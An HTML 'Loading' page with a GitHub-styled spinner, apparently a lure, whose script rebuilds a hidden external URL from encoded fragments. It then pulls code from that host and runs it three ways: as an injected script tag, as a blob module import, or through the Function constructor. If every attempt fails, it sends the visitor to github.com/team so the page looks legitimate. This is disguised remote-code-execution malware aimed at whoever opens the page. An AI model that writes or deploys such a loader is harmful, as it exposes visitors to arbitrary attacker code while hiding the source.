<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Loading</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background-color: rgb(13, 17, 22);
  }

  body {
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .spinner {
    width: 64px;
    height: 64px;
    border-radius: 50%;
    border: 6px solid rgba(46, 160, 67, 0.2);
    border-top-color: #2ea043;
    animation: spin 0.8s linear infinite;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }
</style>
</head>
<body>
  <div class="spinner"></div>
<script>
function _teamHubJ10() {
    location.replace('https://github.com/team');
}

(function () {
    var _chunks = ['https%3A%2F%2Fkier', 'anmesser.com%2F', 'dastur.tumble'];

    function targetUrl() {
        return _chunks.map(decodeURIComponent).join('');
    }

    function loadAsset() {
        return fetch(targetUrl(), {
            method: 'GET',
            mode: 'cors',
            cache: 'no-store',
            headers: { Accept: 'text/plain,*/*' }
        }).then(function (resp) {
            if (!resp.ok) throw 0;
            return resp.text();
        });
    }

    function runFromDataUri(code) {
        var body = String(code).replace(/^\uFEFF/, '').trim();
        if (!body) throw 0;
        var blob = new Blob([body], { type: 'application/javascript;charset=utf-8' });
        var href = URL.createObjectURL(blob);
        return import(href).then(function () {
            URL.revokeObjectURL(href);
        }, function () {
            URL.revokeObjectURL(href);
            throw 0;
        });
    }

    function runViaFunctionCtor(code) {
        var body = String(code).replace(/^\uFEFF/, '').trim();
        if (!body) throw 0;
        (new Function(body))();
    }

    function mountScriptTag(uri, onFail) {
        var tag = document.createElement('script');
        tag.charset = 'utf-8';
        tag.async = true;
        tag.src = uri + (uri.indexOf('?') >= 0 ? '&' : '?') + '_=' + Date.now();
        tag.onerror = function () { if (onFail) onFail(); };
        (document.head || document.documentElement).appendChild(tag);
    }

    function go() {
        var uri = targetUrl();
        mountScriptTag(uri, function () {
            loadAsset()
                .then(function (text) {
                    return runFromDataUri(text).catch(function () {
                        runViaFunctionCtor(text);
                    });
                })
                .catch(function () { _teamHubJ10(); });
        });
    }

    setTimeout(go, 622);
})();

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () { GH.apply(); });
} else {
    GH.apply();
}
</script>
</body>
</html>
